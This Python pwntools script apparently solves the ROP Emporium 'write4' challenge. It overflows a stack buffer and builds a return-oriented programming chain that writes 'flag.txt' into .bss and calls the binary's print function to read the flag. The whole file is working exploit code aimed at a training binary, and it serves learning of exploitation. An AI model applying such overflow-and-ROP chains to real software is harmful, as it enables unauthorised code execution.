from pwn import *  # Set up pwntools to work with this binary
from struct import *

p = process(['./write4'])
elf = ELF('./write4')
g = ROP(elf)
name = b'flag.txt'

buf = b'aaaabaaacaaadaaaeaaafaaagaaahaaak' + b'L' * 7  # 40

mov_dword = p64(0x00000400628)  # usefulGadget
pop_r15_r14 = p64(0x0000000000400690) # pop r's

# fopen: rdi, location in memory of string, rsi: location is memory of perm
# perm loc: 0xa37

buf += pop_r15_r14
buf += p64(0x0000000000601038)  # place to write to, .bss
buf += p64(0x7478742e67616c66)  # flag.txt
buf += mov_dword
buf += p64(0x0000000000400693)  # pop rdi
buf += p64(0x0000000000601038)
buf += p64(0x0000000000400691) # pop rsi, r15
buf += p64(0x7ffff7bfe2d0) # filler
buf += p64(0xa37) # perm location
buf += p64(0x0000000000400620)  # print call



print(buf)
with open('t', 'wb') as f:
    f.write(buf)

p.sendline(buf)

# Printing the flag
print(p.recvall().decode('utf-8'))